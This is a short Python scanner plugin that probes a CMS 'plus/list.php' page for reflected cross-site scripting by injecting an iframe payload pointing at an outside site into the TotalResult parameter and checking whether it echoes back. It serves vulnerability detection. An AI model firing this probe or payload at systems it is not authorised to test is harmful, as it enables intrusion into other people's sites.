import requests
from termcolor import cprint


class keyword_xss:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "plus/list.php?tid=6&TotalResult=<iframe src=http://www.gohack.org>&nativeplace=0&infotype=0&keyword=&orderby=hot&PageNo=2"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and "<iframe src=http://www.gohack.org>" in r.content:
                cprint("target may be list.php xss:" + vulnurl,"red")
        except:
            return False